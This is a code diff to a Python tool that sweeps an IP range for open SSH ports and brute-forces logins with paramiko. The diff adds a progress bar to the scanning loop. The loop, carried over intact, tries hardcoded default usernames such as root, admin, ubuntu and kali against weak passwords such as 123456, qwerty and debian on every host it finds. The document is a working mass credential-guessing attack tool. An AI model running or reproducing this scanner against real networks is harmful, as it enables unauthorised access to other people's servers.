@@ -1,6 +1,7 @@
 import argparse
-import socket
 import ipaddress
+import progressbar
+import socket
 import threading
 import paramiko
 
@@ -62,29 +63,38 @@ def brute_force(ip, username, passwords, protocol):
 def scan_range(ip_range):
     """Scans the IP range for open SSH ports and attempt to authenticate"""
 
-    for ip in ipaddress.IPv4Network(ip_range):
-        banner = grab_banner(str(ip), 22)
-        if not banner:
-            continue
+    # Calculate the total number of IPs in the range
+    num_ips = len(list(ipaddress.IPv4Network(ip_range).hosts()))
 
-        print(f"\n[*] Scanning {ip}")
-        print(f"\033[94m[+] Found open port 22 on {ip} ({banner})\033[0m")
+    with progressbar.ProgressBar(max_value=num_ips) as progress:
+        count = 0
 
-        if "SSH-1.5" in banner:
-            protocol = "SSH-1.5"
-        else:
-            protocol = "SSH-2.0"
-
-        usernames = ["root", "admin", "ubuntu", "kali"]
-        passwords_try_1 = ["root", "kali", "123456"]
-        passwords_try_2 = ["qwerty", "debian", "admin"]
-
-        for username in usernames:
-            brute_force(ip, username, passwords_try_1, protocol)
-            if not authenticate(ip, username, passwords_try_1[0], protocol):
+        for ip in ipaddress.IPv4Network(ip_range):
+            banner = grab_banner(str(ip), 22)
+            if not banner:
                 continue
-            brute_force(ip, username, passwords_try_2, protocol)
-            break
+
+            print(f"\n[*] Scanning {ip}")
+            print(f"\033[94m[+] Found open port 22 on {ip} ({banner})\033[0m")
+
+            if "SSH-1.5" in banner:
+                protocol = "SSH-1.5"
+            else:
+                protocol = "SSH-2.0"
+
+            usernames = ["root", "admin", "ubuntu", "kali"]
+            passwords_try_1 = ["root", "kali", "123456"]
+            passwords_try_2 = ["qwerty", "debian", "admin"]
+
+            for username in usernames:
+                brute_force(ip, username, passwords_try_1, protocol)
+                if not authenticate(ip, username, passwords_try_1[0], protocol):
+                    continue
+                brute_force(ip, username, passwords_try_2, protocol)
+                break
+
+            count += 1
+            progress.update(count)
 
 
 def main():
